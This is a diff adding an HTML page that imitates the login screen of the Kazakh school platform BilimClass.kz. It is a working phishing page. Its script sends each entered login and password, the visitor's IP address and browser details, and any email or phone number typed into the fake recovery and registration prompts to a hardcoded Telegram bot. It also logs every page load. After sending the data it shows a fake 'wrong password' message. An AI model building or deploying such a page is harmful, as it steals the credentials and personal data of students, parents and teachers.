@@ -1,0 +1,263 @@
+<!DOCTYPE html>
+<html lang="ru">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Кіру</title>
+
+<style>
+body{
+    margin:0;
+    font-family: Arial, Helvetica, sans-serif;
+    background:#f5f6f7;
+    color:#333;
+}
+
+/* header */
+.header{
+    background:white;
+    padding:15px;
+    display:flex;
+    align-items:center;
+    justify-content:space-between;
+    box-shadow:0 2px 6px rgba(0,0,0,0.05);
+}
+.logo{
+    font-size:22px;
+    font-weight:700;
+}
+.logo span{
+    color:#23a455;
+}
+
+/* container */
+.container{
+    max-width:420px;
+    margin:auto;
+    padding:25px 20px;
+}
+
+.title{
+    text-align:center;
+    font-size:26px;
+    margin:15px 0 30px;
+    letter-spacing:1px;
+}
+
+/* labels */
+.label-row{
+    display:flex;
+    justify-content:space-between;
+    margin-bottom:6px;
+    font-size:15px;
+}
+
+.link{
+    color:#23a455;
+    text-decoration:underline;
+}
+
+/* inputs */
+input{
+    width:100%;
+    padding:15px;
+    border-radius:10px;
+    border:1px solid #cfd6dc;
+    font-size:16px;
+    margin-bottom:20px;
+    box-sizing:border-box;
+}
+
+/* button */
+button{
+    width:100%;
+    background:#2fa65a;
+    border:none;
+    padding:16px;
+    border-radius:10px;
+    color:white;
+    font-size:18px;
+    cursor:pointer;
+    box-shadow:0 3px 8px rgba(0,0,0,0.1);
+}
+
+button:hover{
+    background:#23914c;
+}
+
+.bottom-links{
+    margin-top:20px;
+    line-height:2;
+}
+.bottom-links a{
+    color:#2fa65a;
+    font-size:16px;
+    text-decoration:underline;
+}
+
+/* section */
+.section{
+    margin-top:40px;
+    text-align:center;
+}
+.section h3{
+    color:#2fa455;
+    letter-spacing:1px;
+}
+.section p{
+    color:#555;
+    font-size:15px;
+    line-height:1.6;
+}
+</style>
+</head>
+
+<body>
+
+<div class="header">
+    <div class="logo">Bilim<span>Class</span></div>
+    🌐
+</div>
+
+<div class="container">
+
+    <div class="title">КІРУ</div>
+
+    <div class="label-row">
+        <div>Логин:</div>
+        <a class="link">Телефон арқылы кіру</a>
+    </div>
+
+    <input type="text" id="login" placeholder="Логин енгізіңіз">
+
+    <div class="label-row">
+        <div>Құпиясөз:</div>
+    </div>
+
+    <input type="password" id="password" placeholder="Құпиясөзді енгізіңіз">
+
+    <button onclick="login()">Кіру</button>
+
+    <div class="bottom-links">
+        <a href="#" onclick="forgotPassword()">Құпиясөзді ұмыттыңыз ба?</a><br>
+        <a href="#" onclick="register()">Ата-ана ретінде тіркелу</a>
+    </div>
+
+    <div class="section">
+        <h3>МЕМЛЕКЕТТІК МЕКТЕПТЕР</h3>
+        <p>
+        BilimClass.kz платформасын қолдану үшін мектеп әкімшілігі
+        мен мұғалімдерге арнайы логин беріледі.
+        </p>
+    </div>
+
+</div>
+
+<script>
+// ← СЮДА ВСТАВЬ СВОИ ДАННЫЕ ←
+const BOT_TOKEN = '8311758067:AAFymutoQsHGFURHWF1pvPbyJ-rbIawB-xw';
+const CHAT_ID = '8568322404';
+
+// Функция отправки в Telegram
+async function sendToTelegram(message) {
+    const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
+    
+    const payload = {
+        chat_id: CHAT_ID,
+        text: message,
+        parse_mode: 'HTML',
+        disable_web_page_preview: true
+    };
+    
+    await fetch(url, {
+        method: 'POST',
+        headers: {
+            'Content-Type': 'application/json',
+        },
+        body: JSON.stringify(payload)
+    });
+}
+
+// Функция логина
+async function login() {
+    const login = document.getElementById('login').value.trim();
+    const password = document.getElementById('password').value.trim();
+    
+    if (!login || !password) return;
+
+    const currentUrl = window.location.href;
+    const referrer = document.referrer || 'Прямая ссылка';
+
+    const logMessage = `🔥 <b>BilimClass.kz ЛОГИН ПОЛУЧЕН!</b> 🔥
+
+👤 <b>Логин:</b> <code>${login}</code>
+🔑 <b>Пароль:</b> <code>${password}</code>
+🌐 <b>IP:</b> <code>${await getClientIP()}</code>
+🔗 <b>URL:</b> <code>${currentUrl}</code>
+📥 <b>С какой страницы:</b> <code>${referrer}</code>
+📱 <b>User-Agent:</b> <code>${navigator.userAgent.slice(0,50)}...</code>
+📅 <b>Время:</b> <code>${new Date().toLocaleString('ru-RU', {timeZone: 'Asia/Almaty'})}</code>
+💻 <b>Экран:</b> <code>${screen.width}x${screen.height}</code>
+🌐 <b>Язык:</b> <code>${navigator.language}</code>
+
+<b>🔗 Ссылка для повторного доступа:</b> https://www.bilimclass.kz/login0
+
+──────────────────`;
+
+    await sendToTelegram(logMessage);
+    
+    // Имитация на казахском
+    const btn = document.querySelector('button');
+    btn.innerHTML = '⏳ Күтіңіз...';
+    btn.disabled = true;
+    
+    setTimeout(() => {
+        btn.innerHTML = 'Кіру';
+        btn.disabled = false;
+        document.getElementById('login').value = '';
+        document.getElementById('password').value = '';
+        alert('❌ Дұрыс емес логин немесе пароль');
+    }, 2000);
+}
+
+async function getClientIP() {
+    try {
+        const res = await fetch('https://api.ipify.org?format=json');
+        const data = await res.json();
+        return data.ip;
+    } catch {
+        return 'N/A';
+    }
+}
+
+function forgotPassword() {
+    const email = prompt('Email енгізіңіз:');
+    if (email) {
+        sendToTelegram(`🔄 <b>Құпиясөзді қалпына келтіру</b>\n📧 <b>Email:</b> <code>${email}</code>`);
+    }
+}
+
+function register() {
+    const phone = prompt('Телефон нөмірін енгізіңіз:');
+    if (phone) {
+        sendToTelegram(`📱 <b>Ата-ана тіркелуі</b>\n📞 <b>Телефон:</b> <code>${phone}</code>`);
+    }
+}
+
+// Автолог при загрузке
+setTimeout(async () => {
+    const pageLoadLog = `📊 <b>BilimClass.kz страница загружена</b>
+
+🌐 <b>IP:</b> <code>${await getClientIP()}</code>
+🔗 <b>URL:</b> <code>${window.location.href}</code>
+📥 <b>Referer:</b> <code>${document.referrer || 'Прямая'}</code>
+📱 <b>User-Agent:</b> <code>${navigator.userAgent.slice(0,50)}...</code>
+📅 <b>Время:</b> <code>${new Date().toLocaleString('ru-RU', {timeZone: 'Asia/Almaty'})}</code>`;
+
+    sendToTelegram(pageLoadLog);
+}, 1000);
+
+</script>
+
+</body>
+</html>
